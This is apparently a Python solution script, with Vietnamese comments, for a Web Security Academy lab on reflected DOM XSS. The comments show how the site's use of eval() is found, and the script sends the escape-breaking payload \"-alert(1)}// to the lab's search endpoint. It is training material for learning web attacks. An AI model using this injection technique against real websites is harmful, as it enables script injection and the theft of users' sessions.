# Web tồn tại lỗ hổng DOM-XSS Reflected
# Cách thức kiểm tra:
# - Ta nhập thử 1 chuỗi bất kỳ vào ô search , sau đó sử Ctr+Shift+F để tìm chuỗi đó ở phần Debugger
# - Source hiển thị cho ta thấy `var searchResultsObj = {"results":[],"searchTerm":"chuoi_bat_ky"}` chứng tỏ web đã gán chuỗi kia vào biến searchResultsObj và bắt đầu xử lý nó
# - Tiếp theo ta tìm kiếm searchResultsObj trong searchResult.js và thấy cách nó được xử lý như bên dưới:
# ```
# eval('var searchResultsObj = ' + this.responseText);
#             displaySearchResults(searchResultsObj);
# ```
# - Ta thấy web sử dụng eval để thực thi đoạn code kia, do đó ta có thể chèn mã độc vào payload
# - Do chuỗi được nhập vào server nên bọ lọc sẽ bắt đầu làm việc (các ký tự sẽ bị mã hóa)
# => payload: \"-alert(1)}//
# Chuỗi dữ liệu server trả về sẽ có dạng: {"results":[],"searchTerm":"\\\"-alert(1)}//"

import requests

burp0_url = "https://YOUR_HOST.web-security-academy.net:443/search-results"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "*/*", 
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br", 
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors", 
    "Sec-Fetch-Site": "same-origin", 
    "Te": "trailers"
}
payload='\"-alert(1)}//'
requests.get(burp0_url, headers=burp0_headers,params={"search": payload})